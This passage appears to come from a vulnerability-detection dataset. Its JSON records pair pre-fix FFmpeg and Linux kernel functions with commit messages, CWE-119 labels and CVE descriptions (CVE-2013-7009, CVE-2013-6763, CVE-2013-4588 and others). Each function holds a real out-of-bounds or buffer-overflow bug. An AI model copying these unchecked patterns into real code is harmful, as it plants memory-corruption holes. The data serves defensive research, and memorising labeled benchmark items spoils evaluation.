FF_ARRAY_ELEMS(gray_pix_fmts);\n            break;\n        case 18:\n            possible_fmts = yuv_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(yuv_pix_fmts);\n            break;\n        default:\n            possible_fmts = all_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(all_pix_fmts);\n            break;\n        }\n    }\n    for (i = 0; i < possible_fmts_nb; ++i) {\n        if (pix_fmt_match(possible_fmts[i], ncomponents, s->precision, log2_chroma_wh, s->pal8)) {\n            s->avctx->pix_fmt = possible_fmts[i];\n            break;\n        }\n    }\n    if (s->avctx->pix_fmt == AV_PIX_FMT_NONE) {\n        av_log(s->avctx, AV_LOG_ERROR,\n               \"Unknown pix_fmt, profile: %d, colour_space: %d, \"\n               \"components: %d, precision: %d, \"\n               \"cdx[1]: %d, cdy[1]: %d, cdx[2]: %d, cdy[2]: %d\\n\",\n               s->avctx->profile, s->colour_space, ncomponents, s->precision,\n               ncomponents > 2 ? s->cdx[1] : 0,\n               ncomponents > 2 ? s->cdy[1] : 0,\n               ncomponents > 2 ? s->cdx[2] : 0,\n               ncomponents > 2 ? s->cdy[2] : 0);\n    }\n    s->avctx->bits_per_raw_sample = s->precision;\n    return 0;\n}\n", "func_hash": 85678138236663394668367920105380330110, "file_name": "jpeg2000dec.c", "file_hash": 302431616552773541513179460515872757808, "cwe": ["CWE-119"], "cve": "CVE-2013-7012", "cve_desc": "The get_siz function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not prevent attempts to use non-zero image offsets, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7012"}
{"idx": 909, "project": "FFmpeg", "commit_id": "3819db745da2ac7fb3faacb116788c32f4753f34", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/3819db745da2ac7fb3faacb116788c32f4753f34", "commit_message": "avcodec/rpza: Perform pointer advance and checks before using the pointers\n\nFixes out of array accesses\nFixes Ticket2850\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": "static void rpza_decode_stream(RpzaContext *s)\n{\n    int width = s->avctx->width;\n    int stride = s->frame.linesize[0] / 2;\n    int row_inc = stride - 4;\n    int stream_ptr = 0;\n    int chunk_size;\n    unsigned char opcode;\n    int n_blocks;\n    unsigned short colorA = 0, colorB;\n    unsigned short color4[4];\n    unsigned char index, idx;\n    unsigned short ta, tb;\n     unsigned short *pixels = (unsigned short *)s->frame.data[0];\n \n     int row_ptr = 0;\n    int pixel_ptr = 0;\n     int block_ptr;\n     int pixel_x, pixel_y;\n     int total_blocks;\n\n    /* First byte is always 0xe1. Warn if it's different */\n    if (s->buf[stream_ptr] != 0xe1)\n        av_log(s->avctx, AV_LOG_ERROR, \"First chunk byte is 0x%02x instead of 0xe1\\n\",\n            s->buf[stream_ptr]);\n\n    /* Get chunk size, ingnoring first byte */\n    chunk_size = AV_RB32(&s->buf[stream_ptr]) & 0x00FFFFFF;\n    stream_ptr += 4;\n\n    /* If length mismatch use size from MOV file and try to decode anyway */\n    if (chunk_size != s->size)\n        av_log(s->avctx, AV_LOG_ERROR, \"MOV chunk size != encoded chunk size; using MOV chunk size\\n\");\n\n    chunk_size = s->size;\n\n    /* Number of 4x4 blocks in frame. */\n    total_blocks = ((s->avctx->width + 3) / 4) * ((s->avctx->height + 3) / 4);\n\n    /* Process chunk data */\n    while (stream_ptr < chunk_size) {\n        opcode = s->buf[stream_ptr++]; /* Get opcode */\n\n        n_blocks = (opcode & 0x1f) + 1; /* Extract block counter from opcode */\n\n        /* If opcode MSbit is 0, we need more data to decide what to do */\n        if ((opcode & 0x80) == 0) {\n            colorA = (opcode << 8) | (s->buf[stream_ptr++]);\n            opcode = 0;\n            if ((s->buf[stream_ptr] & 0x80) != 0) {\n                /* Must behave as opcode 110xxxxx, using colorA computed\n                 * above. Use fake opcode 0x20 to enter switch block at\n                 * the right place */\n                opcode = 0x20;\n                n_blocks = 1;\n            }\n        }\n\n        switch (opcode & 0xe0) {\n\n        /* Skip blocks */\n        case 0x80:\n            while (n_blocks--) {\n              ADVANCE_BLOCK();\n            }\n            break;\n\n        /* Fill blocks with one color */\n        case 0xa0:\n             colorA = AV_RB16 (&s->buf[stream_ptr]);\n             stream_ptr += 2;\n             while (n_blocks--) {\n                 block_ptr = row_ptr + pixel_ptr;\n                 for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                     for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                        pixels[block_ptr] = colorA;\n                        block_ptr++;\n                     }\n                     block_ptr += row_inc;\n                 }\n                ADVANCE_BLOCK();\n             }\n             break;\n \n        /* Fill blocks with 4 colors */\n        case 0xc0:\n            colorA = AV_RB16 (&s->buf[stream_ptr]);\n            stream_ptr += 2;\n        case 0x20:\n            colorB = AV_RB16 (&s->buf[stream_ptr]);\n            stream_ptr += 2;\n\n            /* sort out the colors */\n            color4[0] = colorB;\n            color4[1] = 0;\n            color4[2] = 0;\n            color4[3] = colorA;\n\n            /* red components */\n            ta = (colorA >> 10) & 0x1F;\n            tb = (colorB >> 10) & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5) << 10;\n            color4[2] |= ((21 * ta + 11 * tb) >> 5) << 10;\n\n            /* green components */\n            ta = (colorA >> 5) & 0x1F;\n            tb = (colorB >> 5) & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5) << 5;\n            color4[2] |= ((21 * ta + 11 * tb) >> 5) << 5;\n\n            /* blue components */\n            ta = colorA & 0x1F;\n            tb = colorB & 0x1F;\n            color4[1] |= ((11 * ta + 21 * tb) >> 5);\n            color4[2] |= ((21 * ta + 11 * tb) >> 5);\n\n             if (s->size - stream_ptr < n_blocks * 4)\n                 return;\n             while (n_blocks--) {\n                 block_ptr = row_ptr + pixel_ptr;\n                 for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                     index = s->buf[stream_ptr++];\n                    for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                        idx = (index >> (2 * (3 - pixel_x))) & 0x03;\n                        pixels[block_ptr] = color4[idx];\n                        block_ptr++;\n                     }\n                     block_ptr += row_inc;\n                 }\n                ADVANCE_BLOCK();\n             }\n             break;\n \n         /* Fill block with 16 colors */\n         case 0x00:\n             if (s->size - stream_ptr < 16)\n                 return;\n             block_ptr = row_ptr + pixel_ptr;\n             for (pixel_y = 0; pixel_y < 4; pixel_y++) {\n                 for (pixel_x = 0; pixel_x < 4; pixel_x++){\n                    /* We already have color of upper left pixel */\n                    if ((pixel_y != 0) || (pixel_x !=0)) {\n                        colorA = AV_RB16 (&s->buf[stream_ptr]);\n                        stream_ptr += 2;\n                    }\n                    pixels[block_ptr] = colorA;\n                    block_ptr++;\n                 }\n                 block_ptr += row_inc;\n             }\n            ADVANCE_BLOCK();\n             break;\n \n         /* Unknown opcode */\n        default:\n            av_log(s->avctx, AV_LOG_ERROR, \"Unknown opcode %d in rpza chunk.\"\n                 \" Skip remaining %d bytes of chunk data.\\n\", opcode,\n                 chunk_size - stream_ptr);\n            return;\n        } /* Opcode switch */\n    }\n}\n", "func_hash": 269902084834802765407826520872887191624, "file_name": "rpza.c", "file_hash": 178523187513410238379567792994301398349, "cwe": ["CWE-119"], "cve": "CVE-2013-7009", "cve_desc": "The rpza_decode_stream function in libavcodec/rpza.c in FFmpeg before 2.1 does not properly maintain a pointer to pixel data, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Apple RPZA data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7009"}
{"idx": 911, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 1, "func": "static int uio_mmap_physical(struct vm_area_struct *vma)\n {\n \tstruct uio_device *idev = vma->vm_private_data;\n \tint mi = uio_find_mem_index(vma);\n \tif (mi < 0)\n \t\treturn -EINVAL;\n \n\tvma->vm_ops = &uio_physical_vm_ops;\n \n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \n \treturn remap_pfn_range(vma,\n \t\t\t       vma->vm_start,\n\t\t\t       idev->info->mem[mi].addr >> PAGE_SHIFT,\n \t\t\t       vma->vm_end - vma->vm_start,\n \t\t\t       vma->vm_page_prot);\n }\n", "func_hash": 124769329517591234580599514826095154999, "file_name": "uio.c", "file_hash": 189572155418256998497990912527406881994, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 912, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 1, "func": " int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)\n {\n \tstruct au1100fb_device *fbdev;\n\tunsigned int len;\n\tunsigned long start=0, off;\n \n \tfbdev = to_au1100fb_device(fbi);\n \n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n\t\treturn -EINVAL;\n\t}\n\tstart = fbdev->fb_phys & PAGE_MASK;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n\tif ((vma->vm_end - vma->vm_start + off) > len) {\n\t\treturn -EINVAL;\n\t}\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6\n \n\tif (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t\tvma->vm_end - vma->vm_start,\n\t\t\t\tvma->vm_page_prot)) {\n\t\treturn -EAGAIN;\n\t}\n\treturn 0;\n }\n", "func_hash": 177273139877749557163219661985792046530, "file_name": "au1100fb.c", "file_hash": 171201343492238263084724078982982932789, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 913, "project": "linux", "commit_id": "7314e613d5ff9f0934f7a0f74ed7973b903315d1", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1", "commit_message": "Fix a few incorrectly checked [io_]remap_pfn_range() calls\n\nNico Golde reports a few straggling uses of [io_]remap_pfn_range() that\nreally should use the vm_iomap_memory() helper.  This trivially converts\ntwo of them to the helper, and comments about why the third one really\nneeds to continue to use remap_pfn_range(), and adds the missing size\ncheck.\n\nReported-by: Nico Golde <nico@ngolde.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.", "target": 1, "func": " static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)\n {\n\tunsigned int len;\n\tunsigned long start=0, off;\n \tstruct au1200fb_device *fbdev = info->par;\n \n\tif (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {\n\t\treturn -EINVAL;\n\t}\n\tstart = fbdev->fb_phys & PAGE_MASK;\n\tlen = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);\n\toff = vma->vm_pgoff << PAGE_SHIFT;\n\tif ((vma->vm_end - vma->vm_start + off) > len) {\n\t\treturn -EINVAL;\n\t}\n\toff += start;\n\tvma->vm_pgoff = off >> PAGE_SHIFT;\n \tvma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);\n \tpgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */\n \n\treturn io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n\t\t\t\t  vma->vm_end - vma->vm_start,\n\t\t\t\t  vma->vm_page_prot);\n }\n", "func_hash": 67752722467221074330046327748380108876, "file_name": "au1200fb.c", "file_hash": 20588446351461834577785008862824021623, "cwe": ["CWE-119"], "cve": "CVE-2013-6763", "cve_desc": "The uio_mmap_physical function in drivers/uio/uio.c in the Linux kernel before 3.12 does not validate the size of a memory block, which allows local users to cause a denial of service (memory corruption) or possibly gain privileges via crafted mmap operations, a different vulnerability than CVE-2013-4511.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6763"}
{"idx": 916, "project": "linux", "commit_id": "6fb392b1a63ae36c31f62bc3fc8630b49d602b62", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/6fb392b1a63ae36c31f62bc3fc8630b49d602b62", "commit_message": "qeth: avoid buffer overflow in snmp ioctl\n\nCheck user-defined length in snmp ioctl request and allow request\nonly if it fits into a qeth command buffer.\n\nSigned-off-by: Ursula Braun <ursula.braun@de.ibm.com>\nSigned-off-by: Frank Blaschka <frank.blaschka@de.ibm.com>\nReviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com>\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nCc: <stable@vger.kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 1, "func": "int qeth_snmp_command(struct qeth_card *card, char __user *udata)\n{\n \tstruct qeth_cmd_buffer *iob;\n \tstruct qeth_ipa_cmd *cmd;\n \tstruct qeth_snmp_ureq *ureq;\n\tint req_len;\n \tstruct qeth_arp_query_info qinfo = {0, };\n \tint rc = 0;\n \n\tQETH_CARD_TEXT(card, 3, \"snmpcmd\");\n\n\tif (card->info.guestlan)\n\t\treturn -EOPNOTSUPP;\n\n\tif ((!qeth_adp_supported(card, IPA_SETADP_SET_SNMP_CONTROL)) &&\n\t    (!card->options.layer2)) {\n\t\treturn -EOPNOTSUPP;\n\t}\n \t/* skip 4 bytes (data_len struct member) to get req_len */\n \tif (copy_from_user(&req_len, udata + sizeof(int), sizeof(int)))\n \t\treturn -EFAULT;\n \tureq = memdup_user(udata, req_len + sizeof(struct qeth_snmp_ureq_hdr));\n \tif (IS_ERR(ureq)) {\n \t\tQETH_CARD_TEXT(card, 2, \"snmpnome\");\n\t\treturn PTR_ERR(ureq);\n\t}\n\tqinfo.udata_len = ureq->hdr.data_len;\n\tqinfo.udata = kzalloc(qinfo.udata_len, GFP_KERNEL);\n\tif (!qinfo.udata) {\n\t\tkfree(ureq);\n\t\treturn -ENOMEM;\n\t}\n\tqinfo.udata_offset = sizeof(struct qeth_snmp_ureq_hdr);\n\n\tiob = qeth_get_adapter_cmd(card, IPA_SETADP_SET_SNMP_CONTROL,\n\t\t\t\t   QETH_SNMP_SETADP_CMDLENGTH + req_len);\n\tcmd = (struct qeth_ipa_cmd *)(iob->data+IPA_PDU_HEADER_SIZE);\n\tmemcpy(&cmd->data.setadapterparms.data.snmp, &ureq->cmd, req_len);\n\trc = qeth_send_ipa_snmp_cmd(card, iob, QETH_SETADP_BASE_LEN + req_len,\n\t\t\t\t    qeth_snmp_command_cb, (void *)&qinfo);\n\tif (rc)\n\t\tQETH_DBF_MESSAGE(2, \"SNMP command failed on %s: (0x%x)\\n\",\n\t\t\t   QETH_CARD_IFNAME(card), rc);\n\telse {\n\t\tif (copy_to_user(udata, qinfo.udata, qinfo.udata_len))\n\t\t\trc = -EFAULT;\n\t}\n\n\tkfree(ureq);\n\tkfree(qinfo.udata);\n\treturn rc;\n}\n", "func_hash": 104798081715700399925516111463035480914, "file_name": "qeth_core_main.c", "file_hash": 236635939498951116139550717805292308904, "cwe": ["CWE-119"], "cve": "CVE-2013-6381", "cve_desc": "Buffer overflow in the qeth_snmp_command function in drivers/s390/net/qeth_core_main.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service or possibly have unspecified other impact via an SNMP ioctl call with a length value that is incompatible with the command-buffer size.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6381"}
{"idx": 931, "project": "linux", "commit_id": "04bcef2a83f40c6db24222b27a52892cba39dffb", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/04bcef2a83f40c6db24222b27a52892cba39dffb", "commit_message": "ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command\ncopies; it defines an array with values into which it indexes the cmd\nto find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the\nrange that the array provides, allowing for an index outside of the\narray, which then gives a \"garbage\" result into the length, which\nthen gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ]\nSigned-off-by: Arjan van de Ven <arjan@linux.intel.com>\nAcked-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Simon Horman <horms@verge.net.au>\nSigned-off-by: Patrick McHardy <kaber@trash.net>", "target": 1, "func": "do_ip_vs_set_ctl(struct sock *sk, int cmd, void __user *user, unsigned int len)\n{\n\tint ret;\n\tunsigned char arg[MAX_ARG_LEN];\n\tstruct ip_vs_service_user *usvc_compat;\n\tstruct ip_vs_service_user_kern usvc;\n\tstruct ip_vs_service *svc;\n\tstruct ip_vs_dest_user *udest_compat;\n\tstruct ip_vs_dest_user_kern udest;\n\n \tif (!capable(CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (len != set_arglen[SET_CMDID(cmd)]) {\n \t\tpr_err(\"set_ctl: len %u != %u\\n\",\n \t\t       len, set_arglen[SET_CMDID(cmd)]);\n\t\treturn -EINVAL;\n\t}\n\n\tif (copy_from_user(arg, user, len) != 0)\n\t\treturn -EFAULT;\n\n\t/* increase the module use count */\n\tip_vs_use_count_inc();\n\n\tif (mutex_lock_interruptible(&__ip_vs_mutex)) {\n\t\tret = -ERESTARTSYS;\n\t\tgoto out_dec;\n\t}\n\n\tif (cmd == IP_VS_SO_SET_FLUSH) {\n\t\t/* Flush the virtual service */\n\t\tret = ip_vs_flush();\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_TIMEOUT) {\n\t\t/* Set timeout values for (tcp tcpfin udp) */\n\t\tret = ip_vs_set_timeout((struct ip_vs_timeout_user *)arg);\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_STARTDAEMON) {\n\t\tstruct ip_vs_daemon_user *dm = (struct ip_vs_daemon_user *)arg;\n\t\tret = start_sync_thread(dm->state, dm->mcast_ifn, dm->syncid);\n\t\tgoto out_unlock;\n\t} else if (cmd == IP_VS_SO_SET_STOPDAEMON) {\n\t\tstruct ip_vs_daemon_user *dm = (struct ip_vs_daemon_user *)arg;\n\t\tret = stop_sync_thread(dm->state);\n\t\tgoto out_unlock;\n\t}\n\n\tusvc_compat = (struct ip_vs_service_user *)arg;\n\tudest_compat = (struct ip_vs_dest_user *)(usvc_compat + 1);\n\n\t/* We only use the new structs internally, so copy userspace compat\n\t * structs to extended internal versions */\n\tip_vs_copy_usvc_compat(&usvc, usvc_compat);\n\tip_vs_copy_udest_compat(&udest, udest_compat);\n\n\tif (cmd == IP_VS_SO_SET_ZERO) {\n\t\t/* if no service address is set, zero counters in all */\n\t\tif (!usvc.fwmark && !usvc.addr.ip && !usvc.port) {\n\t\t\tret = ip_vs_zero_all();\n\t\t\tgoto out_unlock;\n\t\t}\n\t}\n\n\t/* Check for valid protocol: TCP or UDP, even for fwmark!=0 */\n\tif (usvc.protocol != IPPROTO_TCP && usvc.protocol != IPPROTO_UDP) {\n\t\tpr_err(\"set_ctl: invalid protocol: %d %pI4:%d %s\\n\",\n\t\t       usvc.protocol, &usvc.addr.ip,\n\t\t       ntohs(usvc.port), usvc.sched_name);\n\t\tret = -EFAULT;\n\t\tgoto out_unlock;\n\t}\n\n\t/* Lookup the exact service by <protocol, addr, port> or fwmark */\n\tif (usvc.fwmark == 0)\n\t\tsvc = __ip_vs_service_get(usvc.af, usvc.protocol,\n\t\t\t\t\t  &usvc.addr, usvc.port);\n\telse\n\t\tsvc = __ip_vs_svc_fwm_get(usvc.af, usvc.fwmark);\n\n\tif (cmd != IP_VS_SO_SET_ADD\n\t    && (svc == NULL || svc->protocol != usvc.protocol)) {\n\t\tret = -ESRCH;\n\t\tgoto out_unlock;\n\t}\n\n\tswitch (cmd) {\n\tcase IP_VS_SO_SET_ADD:\n\t\tif (svc != NULL)\n\t\t\tret = -EEXIST;\n\t\telse\n\t\t\tret = ip_vs_add_service(&usvc, &svc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_EDIT:\n\t\tret = ip_vs_edit_service(svc, &usvc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_DEL:\n\t\tret = ip_vs_del_service(svc);\n\t\tif (!ret)\n\t\t\tgoto out_unlock;\n\t\tbreak;\n\tcase IP_VS_SO_SET_ZERO:\n\t\tret = ip_vs_zero_service(svc);\n\t\tbreak;\n\tcase IP_VS_SO_SET_ADDDEST:\n\t\tret = ip_vs_add_dest(svc, &udest);\n\t\tbreak;\n\tcase IP_VS_SO_SET_EDITDEST:\n\t\tret = ip_vs_edit_dest(svc, &udest);\n\t\tbreak;\n\tcase IP_VS_SO_SET_DELDEST:\n\t\tret = ip_vs_del_dest(svc, &udest);\n\t\tbreak;\n\tdefault:\n\t\tret = -EINVAL;\n\t}\n\n\tif (svc)\n\t\tip_vs_service_put(svc);\n\n  out_unlock:\n\tmutex_unlock(&__ip_vs_mutex);\n  out_dec:\n\t/* decrease the module use count */\n\tip_vs_use_count_dec();\n\n\treturn ret;\n}\n", "func_hash": 83673314409807091768576788287268941887, "file_name": "ip_vs_ctl.c", "file_hash": 16053961743391224455400816259714533604, "cwe": ["CWE-119"], "cve": "CVE-2013-4588", "cve_desc": "Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4588"}
{"idx": 9228, "project": "linux", "commit_id": "04bcef2a83f40c6db24222b27a52892cba39dffb", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/04bcef2a83f40c6db24222b27a52892cba39dffb", "commit_message": "ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command\ncopies; it defines an array with values into which it indexes the cmd\nto find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the\nrange that the array provides, allowing for an index outside of the\narray, which then gives a \"garbage\" result into the length, which\nthen gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ]\nSigned-off-by: Arjan van de Ven <arjan@linux.intel.com>\nAcked-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Simon Horman <horms@verge.net.au>\nSigned-off-by: Patrick McHardy <kaber@trash.net>", "target": 1, "func": "do_ip_vs_get_ctl(struct sock *sk, int cmd, void __user *user, int *len)\n {\n \tunsigned char arg[128];\n \tint ret = 0;\n \n \tif (!capable(CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (*len < get_arglen[GET_CMDID(cmd)]) {\n \t\tpr_err(\"get_ctl: len %u < %u\\n\",\n \t\t       *len, get_arglen[GET_CMDID(cmd)]);\n \t\treturn -EINVAL;\n \t}\n \n\tif (copy_from_user(arg, user, get_arglen[GET_CMDID(cmd)]) != 0)\n \t\treturn -EFAULT;\n \n \tif (mutex_lock_interruptible(&__ip_vs_mutex))\n\t\treturn -ERESTARTSYS;\n\n\tswitch (cmd) {\n\tcase IP_VS_SO_GET_VERSION:\n\t{\n\t\tchar buf[64];\n\n\t\tsprintf(buf, \"IP Virtual Server version %d.%d.%d (size=%d)\",\n\t\t\tNVERSION(IP_VS_VERSION_CODE), IP_VS_CONN_TAB_SIZE);\n\t\tif (copy_to_user(user, buf, strlen(buf)+1) != 0) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\t*len = strlen(buf)+1;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_INFO:\n\t{\n\t\tstruct ip_vs_getinfo info;\n\t\tinfo.version = IP_VS_VERSION_CODE;\n\t\tinfo.size = IP_VS_CONN_TAB_SIZE;\n\t\tinfo.num_services = ip_vs_num_services;\n\t\tif (copy_to_user(user, &info, sizeof(info)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_SERVICES:\n\t{\n\t\tstruct ip_vs_get_services *get;\n\t\tint size;\n\n\t\tget = (struct ip_vs_get_services *)arg;\n\t\tsize = sizeof(*get) +\n\t\t\tsizeof(struct ip_vs_service_entry) * get->num_services;\n\t\tif (*len != size) {\n\t\t\tpr_err(\"length: %u != %u\\n\", *len, size);\n\t\t\tret = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tret = __ip_vs_get_service_entries(get, user);\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_SERVICE:\n\t{\n\t\tstruct ip_vs_service_entry *entry;\n\t\tstruct ip_vs_service *svc;\n\t\tunion nf_inet_addr addr;\n\n\t\tentry = (struct ip_vs_service_entry *)arg;\n\t\taddr.ip = entry->addr;\n\t\tif (entry->fwmark)\n\t\t\tsvc = __ip_vs_svc_fwm_get(AF_INET, entry->fwmark);\n\t\telse\n\t\t\tsvc = __ip_vs_service_get(AF_INET, entry->protocol,\n\t\t\t\t\t\t  &addr, entry->port);\n\t\tif (svc) {\n\t\t\tip_vs_copy_service(entry, svc);\n\t\t\tif (copy_to_user(user, entry, sizeof(*entry)) != 0)\n\t\t\t\tret = -EFAULT;\n\t\t\tip_vs_service_put(svc);\n\t\t} else\n\t\t\tret = -ESRCH;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_DESTS:\n\t{\n\t\tstruct ip_vs_get_dests *get;\n\t\tint size;\n\n\t\tget = (struct ip_vs_get_dests *)arg;\n\t\tsize = sizeof(*get) +\n\t\t\tsizeof(struct ip_vs_dest_entry) * get->num_dests;\n\t\tif (*len != size) {\n\t\t\tpr_err(\"length: %u != %u\\n\", *len, size);\n\t\t\tret = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tret = __ip_vs_get_dest_entries(get, user);\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_TIMEOUT:\n\t{\n\t\tstruct ip_vs_timeout_user t;\n\n\t\t__ip_vs_get_timeouts(&t);\n\t\tif (copy_to_user(user, &t, sizeof(t)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tcase IP_VS_SO_GET_DAEMON:\n\t{\n\t\tstruct ip_vs_daemon_user d[2];\n\n\t\tmemset(&d, 0, sizeof(d));\n\t\tif (ip_vs_sync_state & IP_VS_STATE_MASTER) {\n\t\t\td[0].state = IP_VS_STATE_MASTER;\n\t\t\tstrlcpy(d[0].mcast_ifn, ip_vs_master_mcast_ifn, sizeof(d[0].mcast_ifn));\n\t\t\td[0].syncid = ip_vs_master_syncid;\n\t\t}\n\t\tif (ip_vs_sync_state & IP_VS_STATE_BACKUP) {\n\t\t\td[1].state = IP_VS_STATE_BACKUP;\n\t\t\tstrlcpy(d[1].mcast_ifn, ip_vs_backup_mcast_ifn, sizeof(d[1].mcast_ifn));\n\t\t\td[1].syncid = ip_vs_backup_syncid;\n\t\t}\n\t\tif (copy_to_user(user, &d, sizeof(d)) != 0)\n\t\t\tret = -EFAULT;\n\t}\n\tbreak;\n\n\tdefault:\n\t\tret = -EINVAL;\n\t}\n\n  out:\n\tmutex_unlock(&__ip_vs_mutex);\n\treturn ret;\n}\n", "func_hash": 171209038462118155141573118053075919369, "file_name": "ip_vs_ctl.c", "file_hash": 16053961743391224455400816259714533604, "cwe": ["CWE-119"], "cve": "CVE-2013-4588", "cve_desc": "Multiple stack-based buffer overflows in net/netfilter/ipvs/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) 